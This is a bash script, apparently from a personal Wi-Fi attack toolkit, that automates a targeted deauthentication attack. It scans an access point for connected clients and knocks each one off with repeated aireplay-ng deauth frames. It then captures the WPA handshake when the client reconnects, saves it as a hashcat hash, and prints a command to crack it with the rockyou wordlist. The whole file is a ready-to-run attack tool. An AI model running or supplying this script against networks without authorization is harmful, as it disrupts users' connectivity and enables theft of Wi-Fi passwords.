#!/bin/bash
# Targeted Client Deauth with early exit on success
# Usage: ./attack_client_deauth.sh <BSSID> <CHANNEL> <SSID>

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./attack_client_deauth.sh <BSSID> <CHANNEL> <SSID>"
    exit 1
fi

BSSID=$1
CHANNEL=$2
SSID=$3
CAPTURE_DIR="/home/ov3rr1d3/wifi_arsenal/captures"
SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts"

# Sanitize SSID for filename
if [ -z "$SSID" ] || [ "$SSID" = "<hidden>" ]; then
    SSID="hidden"
fi
SAFE_SSID=$(echo "$SSID" | tr ' /:*?"<>|' '_')

# Generate timestamp
TIME_PART=$(date +%I-%M%p | tr 'A-Z' 'a-z')
DATE_PART=$(date +%m-%d-%Y)
TIMESTAMP="${TIME_PART}_${DATE_PART}"

OUTPUT_PREFIX="$CAPTURE_DIR/AP=${SAFE_SSID}_$TIMESTAMP"

echo "[*] METHOD 3: TARGETED CLIENT DEAUTH WITH EARLY EXIT"
echo "[*] Targeting: $BSSID on channel $CHANNEL"
echo "[*] Strategy: Scan clients → Deauth each → Check after each"
echo ""

# Ensure alfa0 is in monitor mode
echo "[*] Setting alfa0 to monitor mode on channel $CHANNEL..."
$SCRIPT_DIR/mode_manager.sh ensure alfa0 monitor

if [ $? -ne 0 ]; then
    echo "[-] Failed to set monitor mode"
    exit 1
fi

# Set channel
sudo iw dev alfa0 set channel $CHANNEL

# Scan for connected clients (30 seconds)
echo "[*] Scanning for connected clients (30 seconds)..."
SCAN_PREFIX="/tmp/client_scan_$(date +%s)"
sudo timeout 30 airodump-ng -c $CHANNEL --bssid $BSSID -w "$SCAN_PREFIX" --output-format pcapng alfa0 >/dev/null 2>&1

# Parse CSV to find clients
CSV_FILE="${SCAN_PREFIX}-01.csv"

if [ ! -f "$CSV_FILE" ]; then
    echo "[-] FAILED: Scan did not produce CSV file"
    exit 1
fi

# Extract client MAC addresses
CLIENTS=$(awk -v target="$BSSID" '
    /Station MAC/ {in_stations=1; next}
    in_stations && NF > 0 {
        gsub(/^[ \t]+|[ \t]+$/, "", $1)
        gsub(/^[ \t]+|[ \t]+$/, "", $6)
        if ($6 == target && $1 != "") {
            print $1
        }
    }
' "$CSV_FILE" | grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')

# Cleanup scan files
rm -f "${SCAN_PREFIX}"*.{csv,cap,pcapng,kismet.csv,kismet.netxml,log.csv} 2>/dev/null

if [ -z "$CLIENTS" ]; then
    echo "[-] FAILED: No connected clients found"
    exit 1
fi

CLIENT_COUNT=$(echo "$CLIENTS" | wc -l)
echo "[+] Found $CLIENT_COUNT connected client(s):"
echo "$CLIENTS" | while read client; do
    echo "    - $client"
done
echo ""

# Start capture in background
echo "[*] Starting packet capture..."
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w "$OUTPUT_PREFIX" --output-format pcapng alfa0 >/dev/null 2>&1 &
AIRODUMP_PID=$!

# Wait for airodump to initialize
sleep 3

# Function to cleanup
cleanup() {
    kill $AIRODUMP_PID 2>/dev/null
    wait $AIRODUMP_PID 2>/dev/null
    rm -f "${OUTPUT_PREFIX}-01.csv" "${OUTPUT_PREFIX}-01.kismet.csv" "${OUTPUT_PREFIX}-01.kismet.netxml" "${OUTPUT_PREFIX}-01.log.csv" 2>/dev/null
}

# Deauth each client, check after each
CLIENT_NUM=0
echo "$CLIENTS" | while read CLIENT_MAC; do
    CLIENT_NUM=$((CLIENT_NUM + 1))
    echo "[*] Deauthing client $CLIENT_NUM/$CLIENT_COUNT: $CLIENT_MAC"
    sudo aireplay-ng -0 50 -a "$BSSID" -c "$CLIENT_MAC" alfa0 >/dev/null 2>&1
    
    echo "[*] Waiting 10 seconds for reconnection..."
    sleep 10
    
    echo "[*] Checking for handshake..."
    
    # Check for capture file
    cap_file=""
    if [ -f "${OUTPUT_PREFIX}-01.pcapng" ]; then
        cap_file="${OUTPUT_PREFIX}-01.pcapng"
    elif [ -f "${OUTPUT_PREFIX}-01.cap" ]; then
        cap_file="${OUTPUT_PREFIX}-01.cap"
    fi
    
    if [ -n "$cap_file" ]; then
        if $SCRIPT_DIR/check_handshake.sh "$cap_file" "${OUTPUT_PREFIX}.hc22000"; then
            echo ""
            echo "[+] ✓ HANDSHAKE CAPTURED from client $CLIENT_MAC!"
            echo "[+] SUCCESS: Hash file ready: ${OUTPUT_PREFIX}.hc22000"
            cleanup
            echo ""
            echo "[*] To crack:"
            echo "    hashcat -m 22000 ${OUTPUT_PREFIX}.hc22000 /usr/share/wordlists/rockyou.txt"
            exit 0
        fi
    fi
    echo "[*] No handshake yet..."
    echo ""
done

# Check exit status of subshell - if we exited with 0, the whole script should exit
if [ $? -eq 0 ] && [ -f "${OUTPUT_PREFIX}.hc22000" ]; then
    exit 0
fi

echo "[*] All clients tried. Waiting 30 more seconds..."
sleep 30

# Final check
cap_file=""
if [ -f "${OUTPUT_PREFIX}-01.pcapng" ]; then
    cap_file="${OUTPUT_PREFIX}-01.pcapng"
elif [ -f "${OUTPUT_PREFIX}-01.cap" ]; then
    cap_file="${OUTPUT_PREFIX}-01.cap"
fi

if [ -n "$cap_file" ]; then
    if $SCRIPT_DIR/check_handshake.sh "$cap_file" "${OUTPUT_PREFIX}.hc22000"; then
        echo ""
        echo "[+] ✓ HANDSHAKE CAPTURED!"
        echo "[+] SUCCESS: Hash file ready: ${OUTPUT_PREFIX}.hc22000"
        cleanup
        echo ""
        echo "[*] To crack:"
        echo "    hashcat -m 22000 ${OUTPUT_PREFIX}.hc22000 /usr/share/wordlists/rockyou.txt"
        exit 0
    fi
fi

cleanup
echo "[-] FAILED: No valid handshake captured"
exit 1
